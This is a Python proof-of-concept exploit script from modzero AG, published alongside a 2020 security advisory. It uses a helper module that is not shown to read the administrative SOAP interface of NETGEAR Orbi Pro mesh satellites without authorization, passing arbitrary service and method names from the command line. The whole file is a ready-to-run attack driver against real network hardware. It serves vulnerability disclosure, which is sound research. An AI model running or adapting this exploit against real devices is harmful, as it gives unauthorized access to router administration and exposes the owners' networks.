#!python3

# Copyright (c) 2020, modzero AG, Thorsten Schroeder <ths@modzero.ch>
# See the LICENSE file for details.
#
# Netgear Orbi Pro Satellite  -  unauthorized data read
# -- Proof of Concept exploit --
# CVSS:3.1 AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N -> 8.1
#
# This script allows to query the administrative SOAP interfaces of NETGEAR Orbi Pro Mesh Satellites
# without authorization. Currently it is necessary being located in one of the wireless networks or
# on the LAN, connected to the Orbi Pro Router. The latter must be set up in Access-Point (AP) Mode.
#
# See https://www.modzero.com/advisories/Netgear-Orbi-Pro-Security-MZ-20-02.txt for details and
# background. Find all tools and exploits at https://github.com/modzero/MZ-20-02-NETGEAR-Orbi-Security
#
# 2020/01/05 - found issues
# 2020/01/06 - finished first poc exploit
# 2020/01/15 - finished draft report/security advisory
#

import socket
import sys
from netgear import OrbiSoap


def query_orbi_satellite(hostname, service, method):
    host = socket.gethostbyname(hostname)

    soap = OrbiSoap(host)
    sessionid = soap.authenticate()

    if not sessionid:
        print("[!] failed to authenticate at ORBI SOAP service.")
        return False

    xmldata = soap.generic_soap_request(service, method)

    return xmldata


# demo
def main(ac, av):
    ret = False

    if ac == 4:
        host = av[1]
        service = av[2]
        method = av[3]
        ret = query_orbi_satellite(host, service, method)
    else:
        print("usage: {} <host> <service> <method>".format(av[0]))
        sys.exit(0)

    if ret:
        print("[*] Success:")
        print(ret)


if __name__ == "__main__":
    # main(4, ["script.py", "10.11.42.243", "DeviceInfo", "GetInfo_DeviceInfo"])
    main(len(sys.argv), sys.argv)
